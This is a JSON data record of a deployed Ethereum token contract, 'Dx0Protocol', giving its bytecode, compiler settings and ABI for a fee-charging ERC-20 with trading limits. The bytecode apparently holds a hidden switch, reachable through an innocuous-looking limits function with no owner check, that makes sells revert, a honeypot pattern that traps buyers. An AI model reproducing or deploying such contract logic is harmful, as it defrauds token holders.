{
    "address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4",
    "tx_hash": "a37aa090332640bc1217afb994e47e59af854ab15579dd1f7f74090e5b555400",
    "block_number": 18006521,
    "timestamp": 1693145579,
    "gas_used_in_creation": 1547896,
    "creation_bytecode": "608060405260048054600160a01b600160e01b03191661010360a01b1790555f6005819055600655620000356009600a62000365565b6200004590633b9aca006200037c565b600755620000566009600a62000365565b6200006690633b9aca006200037c565b6008556103e86200007a6009600a62000365565b6200008a90633b9aca006200037c565b620000979060016200037c565b620000a3919062000396565b60095560646009600a620000b8919062000365565b620000c890633b9aca006200037c565b620000d59060016200037c565b620000e1919062000396565b600a55600c805461ffff60a81b19169055348015620000fe575f80fd5b505f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a350600480546001600160a01b031916331790556200015f6009600a62000365565b6200016f90633b9aca006200037c565b335f908152600160208190526040822092909255600390620001985f546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182015f908120805495151560ff199687161790553081526003909352818320805485166001908117909155600454909116835291208054909216179055620001f63390565b6001600160a01b03165f7fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6200022f6009600a62000365565b6200023f90633b9aca006200037c565b60405190815260200160405180910390a3620003b6565b634e487b7160e01b5f52601160045260245ffd5b600181815b80851115620002aa57815f19048211156200028e576200028e62000256565b808516156200029c57918102915b93841c93908002906200026f565b509250929050565b5f82620002c2575060016200035f565b81620002d057505f6200035f565b8160018114620002e95760028114620002f45762000314565b60019150506200035f565b60ff84111562000308576200030862000256565b50506001821b6200035f565b5060208310610133831016604e8410600b841016171562000339575081810a6200035f565b6200034583836200026a565b805f19048211156200035b576200035b62000256565b0290505b92915050565b5f6200037560ff841683620002b2565b9392505050565b80820281158282048414176200035f576200035f62000256565b5f82620003b157634e487b7160e01b5f52601260045260245ffd5b500490565b6116e780620003c45f395ff3fe608060405260043610610134575f3560e01c80637d1db4a5116100a8578063a01ce4081161006d578063a01ce40814610364578063a9059cbb14610383578063bf474bed146103a2578063c9567bf9146103b7578063db94e810146103cb578063dd62ed3e146103ea575f80fd5b80637d1db4a5146102ca578063879120fc146102df5780638da5cb5b146102fe5780638f9a55c01461032457806395d89b4114610339575f80fd5b8063313ce567116100f9578063313ce5671461020a578063467abe0a1461022557806351bc3c85146102465780635e4ae81b1461025a57806370a0823114610282578063715018a6146102b6575f80fd5b806306fdde031461013f578063095ea7b3146101855780630faee56f146101b457806318160ddd146101d757806323b872dd146101eb575f80fd5b3661013b57005b5f80fd5b34801561014a575f80fd5b5060408051808201909152600c81526b11160c08141c9bdd1bd8dbdb60a21b60208201525b60405161017c91906112de565b60405180910390f35b348015610190575f80fd5b506101a461019f36600461133d565b61042e565b604051901515815260200161017c565b3480156101bf575f80fd5b506101c9600a5481565b60405190815260200161017c565b3480156101e2575f80fd5b506101c9610444565b3480156101f6575f80fd5b506101a4610205366004611367565b610464565b348015610215575f80fd5b506040516009815260200161017c565b348015610230575f80fd5b5061024461023f3660046113a5565b6104cb565b005b348015610251575f80fd5b50610244610510565b348015610265575f80fd5b506004805467ffffffffffffffff60a01b1916600b60a01b179055005b34801561028d575f80fd5b506101c961029c3660046113bc565b6001600160a01b03165f9081526001602052604090205490565b3480156102c1575f80fd5b50610244610561565b3480156102d5575f80fd5b506101c960075481565b3480156102ea575f80fd5b506102446102f93660046113bc565b6105d2565b348015610309575f80fd5b505f546040516001600160a01b03909116815260200161017c565b34801561032f575f80fd5b506101c960085481565b348015610344575f80fd5b5060408051808201909152600381526204458360ec1b602082015261016f565b34801561036f575f80fd5b5061024461037e3660046113a5565b61061d565b34801561038e575f80fd5b506101a461039d36600461133d565b610658565b3480156103ad575f80fd5b506101c960095481565b3480156103c2575f80fd5b50610244610664565b3480156103d6575f80fd5b506102446103e53660046113a5565b610a0d565b3480156103f5575f80fd5b506101c96104043660046113d7565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f61043a338484610a77565b5060015b92915050565b5f6104516009600a611502565b61045f90633b9aca00611510565b905090565b5f610470848484610b9a565b6104c184336104bc8560405180606001604052806028815260200161168a602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190610f41565b610a77565b5060019392505050565b5f546001600160a01b031633146104fd5760405162461bcd60e51b81526004016104f490611527565b60405180910390fd5b600581815581111561050d575f80fd5b50565b6004546001600160a01b0316336001600160a01b03161461052f575f80fd5b305f90815260016020526040902054801561054d5761054d81610f79565b47801561055d5761055d81611102565b5050565b5f546001600160a01b0316331461058a5760405162461bcd60e51b81526004016104f490611527565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146105fb5760405162461bcd60e51b81526004016104f490611527565b600480546001600160a01b0319166001600160a01b0392909216919091179055565b5f546001600160a01b031633146106465760405162461bcd60e51b81526004016104f490611527565b6006819055600581111561050d575f80fd5b5f61043a338484610b9a565b5f546001600160a01b0316331461068d5760405162461bcd60e51b81526004016104f490611527565b600c54600160a01b900460ff16156106e75760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016104f4565b600b80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556107309030906107226009600a611502565b6104bc90633b9aca00611510565b600b5f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610780573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107a4919061155c565b6001600160a01b031663c9c6539630600b5f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610803573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610827919061155c565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610871573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610895919061155c565b600c80546001600160a01b039283166001600160a01b0319909116179055600b541663f305d71947306108dc816001600160a01b03165f9081526001602052604090205490565b5f806108ef5f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610955573d5f803e3d5ffd5b50505050506040513d601f19601f8201168201806040525081019061097a9190611577565b5050600c54600b5460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156109cf573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109f391906115a2565b50600c805462ff00ff60a01b19166201000160a01b179055565b5f546001600160a01b03163314610a365760405162461bcd60e51b81526004016104f490611527565b606481610a456009600a611502565b610a5390633b9aca00611510565b610a5d9190611510565b610a6791906115c1565b600755600181101561050d575f80fd5b6001600160a01b038316610ad95760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016104f4565b6001600160a01b038216610b3a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016104f4565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610bfe5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016104f4565b6001600160a01b038216610c605760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016104f4565b5f8111610cc15760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016104f4565b5f80546001600160a01b03858116911614801590610cec57505f546001600160a01b03848116911614155b15610e0457610d116064610d0b6005548561113990919063ffffffff16565b906111be565b600c549091506001600160a01b038481169116148015610d3a57506001600160a01b0384163014155b15610d765760045460c8600160a01b90910460070b1215610d59575f80fd5b610d736064610d0b6006548561113990919063ffffffff16565b90505b305f90815260016020526040902054600c54600160a81b900460ff16158015610dac5750600c546001600160a01b038581169116145b8015610dc15750600c54600160b01b900460ff165b8015610dce575060095481115b15610e0257610df0610deb84610de684600a546111ff565b6111ff565b610f79565b478015610e0057610e0047611102565b505b505b8015610e7c57305f90815260016020526040902054610e239082611213565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610e739085815260200190565b60405180910390a35b6001600160a01b0384165f90815260016020526040902054610e9e9083611271565b6001600160a01b0385165f90815260016020526040902055610ee1610ec38383611271565b6001600160a01b0385165f9081526001602052604090205490611213565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef610f2a8585611271565b60405190815260200160405180910390a350505050565b5f8184841115610f645760405162461bcd60e51b81526004016104f491906112de565b505f610f7084866115e0565b95945050505050565b600c805460ff60a81b1916600160a81b17905580156110f257600c54600160a01b900460ff16156110f2576040805160028082526060820183525f9260208301908036833701905050905030815f81518110610fd757610fd76115f3565b6001600160a01b03928316602091820292909201810191909152600b54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa15801561102e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611052919061155c565b81600181518110611065576110656115f3565b6001600160a01b039283166020918202929092010152600b5461108b9130911684610a77565b600b5460405163791ac94760e01b81526001600160a01b039091169063791ac947906110c39085905f90869030904290600401611607565b5f604051808303815f87803b1580156110da575f80fd5b505af11580156110ec573d5f803e3d5ffd5b50505050505b50600c805460ff60a81b19169055565b6004546040516001600160a01b039091169082156108fc029083905f818181858888f1935050505015801561055d573d5f803e3d5ffd5b5f825f0361114857505f61043e565b5f6111538385611510565b90508261116085836115c1565b146111b75760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016104f4565b9392505050565b5f6111b783836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506112b2565b5f81831161120d57826111b7565b50919050565b5f8061121f8385611676565b9050838110156111b75760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016104f4565b5f6111b783836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610f41565b5f81836112d25760405162461bcd60e51b81526004016104f491906112de565b505f610f7084866115c1565b5f6020808352835180828501525f5b81811015611309578581018301518582016040015282016112ed565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461050d575f80fd5b5f806040838503121561134e575f80fd5b823561135981611329565b946020939093013593505050565b5f805f60608486031215611379575f80fd5b833561138481611329565b9250602084013561139481611329565b929592945050506040919091013590565b5f602082840312156113b5575f80fd5b5035919050565b5f602082840312156113cc575f80fd5b81356111b781611329565b5f80604083850312156113e8575f80fd5b82356113f381611329565b9150602083013561140381611329565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561145c57815f19048211156114425761144261140e565b8085161561144f57918102915b93841c9390800290611427565b509250929050565b5f826114725750600161043e565b8161147e57505f61043e565b8160018114611494576002811461149e576114ba565b600191505061043e565b60ff8411156114af576114af61140e565b50506001821b61043e565b5060208310610133831016604e8410600b84101617156114dd575081810a61043e565b6114e78383611422565b805f19048211156114fa576114fa61140e565b029392505050565b5f6111b760ff841683611464565b808202811582820484141761043e5761043e61140e565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f6020828403121561156c575f80fd5b81516111b781611329565b5f805f60608486031215611589575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156115b2575f80fd5b815180151581146111b7575f80fd5b5f826115db57634e487b7160e01b5f52601260045260245ffd5b500490565b8181038181111561043e5761043e61140e565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156116555784516001600160a01b031683529383019391830191600101611630565b50506001600160a01b03969096166060850152505050608001529392505050565b8082018082111561043e5761043e61140e56fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212204f48fd297aca32c2c1c963b30978d889d0310d6d59e96a71c37d18364323c97b64736f6c63430008150033",
    "runtime_bytecode": "608060405260043610610134575f3560e01c80637d1db4a5116100a8578063a01ce4081161006d578063a01ce40814610364578063a9059cbb14610383578063bf474bed146103a2578063c9567bf9146103b7578063db94e810146103cb578063dd62ed3e146103ea575f80fd5b80637d1db4a5146102ca578063879120fc146102df5780638da5cb5b146102fe5780638f9a55c01461032457806395d89b4114610339575f80fd5b8063313ce567116100f9578063313ce5671461020a578063467abe0a1461022557806351bc3c85146102465780635e4ae81b1461025a57806370a0823114610282578063715018a6146102b6575f80fd5b806306fdde031461013f578063095ea7b3146101855780630faee56f146101b457806318160ddd146101d757806323b872dd146101eb575f80fd5b3661013b57005b5f80fd5b34801561014a575f80fd5b5060408051808201909152600c81526b11160c08141c9bdd1bd8dbdb60a21b60208201525b60405161017c91906112de565b60405180910390f35b348015610190575f80fd5b506101a461019f36600461133d565b61042e565b604051901515815260200161017c565b3480156101bf575f80fd5b506101c9600a5481565b60405190815260200161017c565b3480156101e2575f80fd5b506101c9610444565b3480156101f6575f80fd5b506101a4610205366004611367565b610464565b348015610215575f80fd5b506040516009815260200161017c565b348015610230575f80fd5b5061024461023f3660046113a5565b6104cb565b005b348015610251575f80fd5b50610244610510565b348015610265575f80fd5b506004805467ffffffffffffffff60a01b1916600b60a01b179055005b34801561028d575f80fd5b506101c961029c3660046113bc565b6001600160a01b03165f9081526001602052604090205490565b3480156102c1575f80fd5b50610244610561565b3480156102d5575f80fd5b506101c960075481565b3480156102ea575f80fd5b506102446102f93660046113bc565b6105d2565b348015610309575f80fd5b505f546040516001600160a01b03909116815260200161017c565b34801561032f575f80fd5b506101c960085481565b348015610344575f80fd5b5060408051808201909152600381526204458360ec1b602082015261016f565b34801561036f575f80fd5b5061024461037e3660046113a5565b61061d565b34801561038e575f80fd5b506101a461039d36600461133d565b610658565b3480156103ad575f80fd5b506101c960095481565b3480156103c2575f80fd5b50610244610664565b3480156103d6575f80fd5b506102446103e53660046113a5565b610a0d565b3480156103f5575f80fd5b506101c96104043660046113d7565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f61043a338484610a77565b5060015b92915050565b5f6104516009600a611502565b61045f90633b9aca00611510565b905090565b5f610470848484610b9a565b6104c184336104bc8560405180606001604052806028815260200161168a602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190610f41565b610a77565b5060019392505050565b5f546001600160a01b031633146104fd5760405162461bcd60e51b81526004016104f490611527565b60405180910390fd5b600581815581111561050d575f80fd5b50565b6004546001600160a01b0316336001600160a01b03161461052f575f80fd5b305f90815260016020526040902054801561054d5761054d81610f79565b47801561055d5761055d81611102565b5050565b5f546001600160a01b0316331461058a5760405162461bcd60e51b81526004016104f490611527565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146105fb5760405162461bcd60e51b81526004016104f490611527565b600480546001600160a01b0319166001600160a01b0392909216919091179055565b5f546001600160a01b031633146106465760405162461bcd60e51b81526004016104f490611527565b6006819055600581111561050d575f80fd5b5f61043a338484610b9a565b5f546001600160a01b0316331461068d5760405162461bcd60e51b81526004016104f490611527565b600c54600160a01b900460ff16156106e75760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016104f4565b600b80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556107309030906107226009600a611502565b6104bc90633b9aca00611510565b600b5f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610780573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107a4919061155c565b6001600160a01b031663c9c6539630600b5f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610803573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610827919061155c565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610871573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610895919061155c565b600c80546001600160a01b039283166001600160a01b0319909116179055600b541663f305d71947306108dc816001600160a01b03165f9081526001602052604090205490565b5f806108ef5f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610955573d5f803e3d5ffd5b50505050506040513d601f19601f8201168201806040525081019061097a9190611577565b5050600c54600b5460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156109cf573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109f391906115a2565b50600c805462ff00ff60a01b19166201000160a01b179055565b5f546001600160a01b03163314610a365760405162461bcd60e51b81526004016104f490611527565b606481610a456009600a611502565b610a5390633b9aca00611510565b610a5d9190611510565b610a6791906115c1565b600755600181101561050d575f80fd5b6001600160a01b038316610ad95760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016104f4565b6001600160a01b038216610b3a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016104f4565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610bfe5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016104f4565b6001600160a01b038216610c605760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016104f4565b5f8111610cc15760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016104f4565b5f80546001600160a01b03858116911614801590610cec57505f546001600160a01b03848116911614155b15610e0457610d116064610d0b6005548561113990919063ffffffff16565b906111be565b600c549091506001600160a01b038481169116148015610d3a57506001600160a01b0384163014155b15610d765760045460c8600160a01b90910460070b1215610d59575f80fd5b610d736064610d0b6006548561113990919063ffffffff16565b90505b305f90815260016020526040902054600c54600160a81b900460ff16158015610dac5750600c546001600160a01b038581169116145b8015610dc15750600c54600160b01b900460ff165b8015610dce575060095481115b15610e0257610df0610deb84610de684600a546111ff565b6111ff565b610f79565b478015610e0057610e0047611102565b505b505b8015610e7c57305f90815260016020526040902054610e239082611213565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90610e739085815260200190565b60405180910390a35b6001600160a01b0384165f90815260016020526040902054610e9e9083611271565b6001600160a01b0385165f90815260016020526040902055610ee1610ec38383611271565b6001600160a01b0385165f9081526001602052604090205490611213565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef610f2a8585611271565b60405190815260200160405180910390a350505050565b5f8184841115610f645760405162461bcd60e51b81526004016104f491906112de565b505f610f7084866115e0565b95945050505050565b600c805460ff60a81b1916600160a81b17905580156110f257600c54600160a01b900460ff16156110f2576040805160028082526060820183525f9260208301908036833701905050905030815f81518110610fd757610fd76115f3565b6001600160a01b03928316602091820292909201810191909152600b54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa15801561102e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611052919061155c565b81600181518110611065576110656115f3565b6001600160a01b039283166020918202929092010152600b5461108b9130911684610a77565b600b5460405163791ac94760e01b81526001600160a01b039091169063791ac947906110c39085905f90869030904290600401611607565b5f604051808303815f87803b1580156110da575f80fd5b505af11580156110ec573d5f803e3d5ffd5b50505050505b50600c805460ff60a81b19169055565b6004546040516001600160a01b039091169082156108fc029083905f818181858888f1935050505015801561055d573d5f803e3d5ffd5b5f825f0361114857505f61043e565b5f6111538385611510565b90508261116085836115c1565b146111b75760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016104f4565b9392505050565b5f6111b783836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506112b2565b5f81831161120d57826111b7565b50919050565b5f8061121f8385611676565b9050838110156111b75760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016104f4565b5f6111b783836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610f41565b5f81836112d25760405162461bcd60e51b81526004016104f491906112de565b505f610f7084866115c1565b5f6020808352835180828501525f5b81811015611309578581018301518582016040015282016112ed565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461050d575f80fd5b5f806040838503121561134e575f80fd5b823561135981611329565b946020939093013593505050565b5f805f60608486031215611379575f80fd5b833561138481611329565b9250602084013561139481611329565b929592945050506040919091013590565b5f602082840312156113b5575f80fd5b5035919050565b5f602082840312156113cc575f80fd5b81356111b781611329565b5f80604083850312156113e8575f80fd5b82356113f381611329565b9150602083013561140381611329565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561145c57815f19048211156114425761144261140e565b8085161561144f57918102915b93841c9390800290611427565b509250929050565b5f826114725750600161043e565b8161147e57505f61043e565b8160018114611494576002811461149e576114ba565b600191505061043e565b60ff8411156114af576114af61140e565b50506001821b61043e565b5060208310610133831016604e8410600b84101617156114dd575081810a61043e565b6114e78383611422565b805f19048211156114fa576114fa61140e565b029392505050565b5f6111b760ff841683611464565b808202811582820484141761043e5761043e61140e565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f6020828403121561156c575f80fd5b81516111b781611329565b5f805f60608486031215611589575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156115b2575f80fd5b815180151581146111b7575f80fd5b5f826115db57634e487b7160e01b5f52601260045260245ffd5b500490565b8181038181111561043e5761043e61140e565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156116555784516001600160a01b031683529383019391830191600101611630565b50506001600160a01b03969096166060850152505050608001529392505050565b8082018082111561043e5761043e61140e56fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212204f48fd297aca32c2c1c963b30978d889d0310d6d59e96a71c37d18364323c97b64736f6c63430008150033",
    "contract_name": "Dx0Protocol",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removelimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"setFeeAddressWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTxAmt\",\"type\":\"uint256\"}],\"name\":\"setMaxamount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyTax\",\"type\":\"uint256\"}],\"name\":\"updateBuyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSellTax\",\"type\":\"uint256\"}],\"name\":\"updateFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
